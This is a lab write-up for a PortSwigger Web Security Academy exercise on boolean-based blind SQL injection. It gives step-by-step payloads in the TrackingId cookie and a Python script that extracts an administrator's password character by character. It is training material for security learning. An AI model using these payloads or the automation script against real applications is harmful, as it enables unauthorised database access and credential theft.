# Lab 11 — Blind SQL injection with conditional responses

**Difficulty:** 🟡 Practitioner  
**Technique:** Blind SQLi — boolean-based  
**Database:** PostgreSQL  
**Link:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

## Concept

Unlike previous labs where data was returned directly in the response, here there is no visible output. The only signal is whether the message **"Welcome back"** appears on the page or not.

The injection point is the `TrackingId` cookie. The app runs a query with that value and conditionally renders the message based on the result. This allows us to ask true/false questions about the database and infer data character by character.

---

## Reconnaissance

- **Injection point:** `TrackingId` cookie
- **Signal:** presence or absence of "Welcome back" in the HTML
- **Mechanism:** boolean condition — true shows the message, false does not

---

## Process

### Step 1 — Confirm boolean injection

Verify that the condition affects the response:

```sql
TrackingId=xyz' AND '1'='1   -- Welcome back ✓ (true)
TrackingId=xyz' AND '1'='2   -- no message    (false)
```

The difference confirms the input is evaluated inside a SQL query.

### Step 2 — Confirm the users table exists

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Result:** Welcome back → the `users` table exists.

### Step 3 — Confirm the administrator user exists

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Result:** Welcome back → the user exists.

### Step 4 — Determine password length

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=2)='a
...
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```

**Result:** Welcome back at `LENGTH=20` → password is 20 characters long.

### Step 5 — Extract password character by character

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b
...
```

Repeat for each position (1 to 20) and each character (a-z, 0-9).

---

## The scaling problem

20 positions × 36 characters = **720 requests**.

With Burp Intruder Community (throttled) this takes over 30 minutes. The solution is to automate with Python.

---

## Automation script

```python
import requests
import string

URL         = "https://YOUR-LAB.web-security-academy.net/"
TRACKING_ID = "YOUR-TRACKING-ID"
SESSION     = "YOUR-SESSION"
CHARS       = string.ascii_lowercase + string.digits

def check(payload):
    cookies = {"TrackingId": TRACKING_ID + payload, "Session": SESSION}
    r = requests.get(URL, cookies=cookies)
    return "Welcome back" in r.text

password = ""
for pos in range(1, 21):
    for char in CHARS:
        payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}"
        if check(payload):
            password += char
            print(f"[+] {pos:02d}: {char} → {password}")
            break
print(f"\n[✓] {password}")
```

**Execution time:** under 1 minute.

---

## Issues encountered

**Burp Intruder Cluster bomb setup:**
- Configured two payload sets: position (1-20) and character (a-z, 0-9)
- Grep Match on "Welcome back" worked but the attack was too slow on Community Edition
- Fix: Python script solved the lab in seconds and results matched Burp's findings

---

## Takeaways

- Blind SQLi returns no data — you infer from app behavior
- The true/false difference is the only available signal
- `SUBSTRING(str, pos, len)` extracts one character at a time
- 720 manual requests are not viable — always automate
- Burp Intruder Community is throttled; Python `requests` is the alternative

---

## References

- [Blind SQL Injection — PortSwigger](https://portswigger.net/web-security/sql-injection/blind)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
